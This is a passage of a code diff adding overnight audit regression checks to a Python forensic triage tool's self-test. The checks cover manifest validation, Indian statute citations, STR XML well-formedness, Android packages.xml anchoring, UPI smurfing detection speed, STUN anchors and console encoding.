+                lambda d: d.__setitem__("summary_metrics", 5),
+                lambda d: d.__setitem__("triage_timestamp_utc", 0),
+                lambda d: d["symbolic_anchors"][0].__setitem__("threat_score", float("nan")),
+                lambda d: d.__setitem__("symbolic_anchors", {"a": 1})]
+        problems = []
+        for mut in muts:
+            d = json.loads(json.dumps(m))
+            mut(d)
+            problems.append(validate_manifest(d))
+        return (validate_manifest(m) == [] and all(isinstance(p_, list) and p_ for p_ in problems)), \
+            f"{len(problems)} tampered manifests reported, none raised"
+    check("B-F21/B-01 validate_manifest reports null leads, string/NaN scores and wrong types", f21)
+
+    def f22():   # Section 45 / Section 39 labels
+        c = LogTriageEngine().section45_exculpatory_checklist(
+            {"event_id": 1, "timestamp": "2026-10-14T06:00:00Z", "command_line": "x"}, [])
+        return ("grounds of opinion" in c["statute"] and "Section 39" in c["statute"] and "expert opinion" not in c["statute"]
+                and "Section 45 BSA 2023 expert opinion" not in ADMISSIBILITY_DOCTRINE
+                and "Section 39 BSA 2023" in ADMISSIBILITY_DOCTRINE), c["statute"][:60]
+    check("B-F22 Section 45 BSA is 'grounds of opinion', expert opinion is Section 39", f22)
+
+    def f23():   # Sec 45 checklist names its lead with an absolute anchor (B-S45-01)
+        p = os.path.join(rdir, "s45.img")
+        with open(p, "wb") as f:
+            f.write(bytes(8192) + bundle["events"])
+        o = SutraNeuralTriageOrchestrator(case, output_dir=rdir, device_owner="rahul")
+        o.add_artifact("events", "process_events_jsonl", "SYSMON_EVENT_LOG_JSONL", path=p, base_offset=8192,
+                       length=len(bundle["events"]), extent=True)
+        m = o.run(write=False)
+        s = m["section45_exculpatory_checklist"]
+        logs = [l for l in m["symbolic_anchors"] if l["lead_id"].startswith("LEAD-B-LOG")]
+        tgt = next((l for l in logs if l["lead_id"] == s.get("evaluated_for_lead_id")), None)
+        return (tgt is not None and tgt["threat_score"] == max(l["threat_score"] for l in logs)
+                and s["evaluated_for_lead_offset"] == tgt["symbolic_anchor"]["byte_offset"]
+                and V(s["evaluated_for_anchor"], p)), f"{s.get('evaluated_for_lead_id')} @ {s.get('evaluated_for_lead_offset')}"
+    check("B-F23/B-S45-01 Sec 45 checklist names the screened lead and its absolute anchor", f23)
+
+    def f24():   # STR XML with an XML-illegal control character
+        m = run_data(upi=("upi_csv", bundle["upi"].replace(b"mule1@ybl", b"mule1\x0b@ybl")))
+        st = lead(m, "RAPID_UPI_SMURFING")["statutory_actions"]
+        ET.fromstring(st["fiu_ind_str_xml"])
+        clean = lead(run_data(upi=("upi_csv", bundle["upi"])), "RAPID_UPI_SMURFING")["statutory_actions"]
+        return (st["fiu_ind_str_xml_ready"] is False and st.get("fiu_ind_str_xml_problems")
+                and clean["fiu_ind_str_xml_ready"] is True), "well-formed, marked not ready with a reason"
+    check("B-F24 a control character in a VPA keeps the STR XML well-formed and not 'ready'", f24)
+
+    def f25():   # commented-out <package> cannot take the anchor
+        xml = (b'<?xml version="1.0"?>\n<packages>\n<!-- migrated from <package name="com.challan.update" /> -->\n'
+               b'<package name="com.challan.update" codePath="/data/app/x" installer="">\n'
+               b'  <perms><item name="android.permission.BIND_ACCESSIBILITY_SERVICE" granted="true"/></perms>\n'
+               b'</package>\n</packages>\n')
+        a = lead(run_data(pk=("packages_xml", xml)), "ANDROID_TROJAN_CAPABILITY")["symbolic_anchor"]
+        span = xml[a["byte_offset"]:a["byte_offset"] + a["length"]]
+        return (span.startswith(b"<package name") and span.endswith(b"</package>")
+                and b"BIND_ACCESSIBILITY_SERVICE" in span), f"anchor @{a['byte_offset']}+{a['length']}"
+    check("B-F25 packages.xml anchors come from the parser: a commented <package> is ignored", f25)
+
+    def f26():   # time-indexed smurfing and bridge matching
+        t0 = 1792000000.0
+        rows = [{"txn_id": f"T{i}", "rrn": "", "epoch": t0 + 60.0 * i, "amount_inr": 100.0 + i % 50,
+                 "payer_vpa": f"cust{i}@ybl", "payee_vpa": "shop@ybl", "payee_ifsc": "YESB0000001"} for i in range(5000)]
+        fin = FinancialMuleDetector()
+        t = time.perf_counter()
+        fin.detect_smurfing(rows)
+        t_s = time.perf_counter() - t
+        chain = [{"tx_hash": f"0x{i}", "epoch": t0 + 600.0 * i, "amount_usdt": 50.0} for i in range(1000)]
+        t = time.perf_counter()
+        fin.match_bridges(rows[:1000], chain)
+        t_b = time.perf_counter() - t
+        return t_s < 0.8 and t_b < 0.8, f"5,000 rows {t_s:.3f}s, 1,000 x 1,000 bridges {t_b:.3f}s"
+    check("B-F26 smurfing and bridge matching are time-indexed, not O(n^2)", f26)
+
+    def frz():   # B's freeze notice defers to Sector D's
+        st = lead(run_data(upi=("upi_csv", bundle["upi"])), "RAPID_UPI_SMURFING")["statutory_actions"]
+        return (st["bnss_sec_106_freeze_ready"] is False and st["bnss_sec_106_fields_complete"] is True
+                and "SECTOR_D" in st["freeze_notice"]["notice_status"]), st["freeze_notice"]["notice_status"]
+    check("B-FRZ01 B's gross-credit freeze view is marked preliminary and superseded by Sector D", frz)
+
+    def tz():   # device-local offset exported
+        o = SutraNeuralTriageOrchestrator(case, output_dir=rdir, log_utc_offset_minutes=0)
+        o.add_artifact("ad", "anydesk_trace", "ANYDESK_CONNECTION_TRACE", data=bundle["anydesk"])
+        m = o.run(write=False)
+        return m["engine_runtime"].get("log_utc_offset_minutes") == 0, f"engine_runtime {m['engine_runtime'].get('log_utc_offset_minutes')}"
+    check("B-TZ01 the device-local log offset is recorded in engine_runtime", tz)
+
+    def stun():   # STUN/TURN entries carry absolute anchors
+        off, ln = layout["whatsapp"]
+        o = SutraNeuralTriageOrchestrator(case, output_dir=rdir)
+        o.add_artifact("whatsapp", "whatsapp_log", "ANDROID_WHATSAPP_LOG", path=image, base_offset=off, length=ln,
+                       extent=True)
+        m = o.run(write=False)
+        sv = lead(m, "WEBRTC_PEER_ENDPOINT")["lead_details"]["stun_turn_servers"]
+        return sv and all(s["byte_offset"] >= off and V(s, image) for s in sv), \
+            f"{len(sv)} servers @ {sorted({s['byte_offset'] for s in sv})}"
+    check("B-STUN01 stun_turn_servers offsets are absolute in the image and re-hash", stun)
+
+    def art():   # artifacts[] are verifiable anchors
+        o = SutraNeuralTriageOrchestrator(case, output_dir=rdir)
+        for name, kind in (("chat", "chat_transcript"), ("upi", "upi_csv")):
+            off, ln = layout[name]
+            o.add_artifact(name, kind, "TEST", path=image, base_offset=off, length=ln, extent=True)
+        arts = o.run(write=False)["artifacts"]
+        return all(a.get("file_path") == image and a.get("offset_basis") == "ABSOLUTE_IN_FILE" and V(a, a["file_path"])
+                   for a in arts), f"{sum(1 for a in arts if a.get('file_path'))}/{len(arts)} entries name their file"
+    check("B-ART01 artifacts[] entries name their file and offset basis and re-hash", art)
+
+    def strr():  # STR citation matches Sector D
+        st = lead(run_data(upi=("upi_csv", bundle["upi"])), "RAPID_UPI_SMURFING")["statutory_actions"]
+        statute = ET.fromstring(st["fiu_ind_str_xml"]).find("Statute").text
+        return "read with Rule 8," in statute and "Rule 3" not in statute, statute[-60:]
+    check("B-STR01 STR summary cites Section 12 PMLA read with Rule 8, as Sector D does", strr)
+
+    def console():   # cp1252 / ascii consoles: what the __main__ entry does before the self-test prints
+        res, saved = [], sys.stdout
+        try:
+            for enc in ("cp1252", "ascii"):
+                buf = io.BytesIO()
+                sys.stdout = io.TextIOWrapper(buf, encoding=enc)
+                _safe_console()
+                print("SUTRA-Trace Sector B self-test  \u00b7  \u2192 \u2714 \u20b9 \U0001F600")
+                sys.stdout.flush()
+                res.append(b"\\u2192" in buf.getvalue())
+        finally:
+            sys.stdout = saved
+        return all(res), "unencodable characters escaped on cp1252 and ascii consoles"
+    check("CONSOLE self-test output survives a cp1252 or ascii console", console)
+    return out
+
+
+def _utc_like(epoch: float) -> str:
+    """'YYYY-MM-DDTHH:MM:SS' (no zone) for an epoch, without gmtime()."""
+    return iso_utc(epoch)[:19]
+
+
 def _self_test(workdir: str) -> int:
     os.makedirs(workdir, exist_ok=True)
     results: List[Tuple[str, bool]] = []
@@ -3219,8 +4350,13 @@ def _self_test(workdir: str) -> int:
     reg_passed = sum(ok for _, ok in regressions)
     print(f"\n{reg_passed}/{len(regressions)} audit regression checks passed")
     print(f"{passed}/{len(results)} checks passed")
-    return 0 if passed == len(results) and reg_passed == len(regressions) else 1
+    overnight = _overnight_regressions(workdir, image, layout,
+                                       os.path.join(workdir, "sector_a", SECTOR_A_MANIFEST) if a_manifest else None)
+    ov_passed = sum(ok for _, ok in overnight)
+    print(f"\n{ov_passed}/{len(overnight)} overnight audit regression checks passed")
+    return 0 if passed == len(results) and reg_passed == len(regressions) and ov_passed == len(overnight) else 1
 
 
 if __name__ == "__main__":
+    _safe_console()
     sys.exit(_self_test(sys.argv[1] if len(sys.argv) > 1 else os.path.join(os.getcwd(), "sutra_triage_selftest")))
